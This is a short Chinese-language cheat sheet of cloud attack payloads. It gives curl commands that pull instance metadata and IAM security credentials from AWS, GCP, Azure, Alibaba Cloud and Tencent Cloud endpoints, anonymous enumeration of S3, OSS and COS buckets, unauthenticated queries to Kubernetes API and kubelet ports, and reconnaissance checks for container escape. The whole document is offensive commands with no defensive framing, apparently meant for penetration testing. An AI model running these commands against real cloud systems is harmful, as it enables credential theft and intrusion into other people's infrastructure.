# 云安全 Payload 速查

## 云元数据端点

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"

# Azure
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata:true"

# 阿里云
curl http://100.100.100.200/latest/meta-data/

# 腾讯云
curl http://metadata.tencentyun.com/latest/meta-data/
```

## S3/存储桶

```bash
# AWS S3 枚举
curl https://{name}.s3.amazonaws.com
curl https://s3.amazonaws.com/{name}
aws s3 ls s3://{name} --no-sign-request

# 阿里云OSS
curl https://{name}.oss-cn-hangzhou.aliyuncs.com

# 腾讯云COS
curl https://{name}.cos.ap-guangzhou.myqcloud.com
```

## K8s

```bash
# K8s API
curl -k https://{target}:6443/api/v1/pods
curl -k https://{target}:10250/pods

# 容器逃逸
cat /proc/1/cgroup
ls -la /var/run/docker.sock
mount | grep docker
capsh --print
```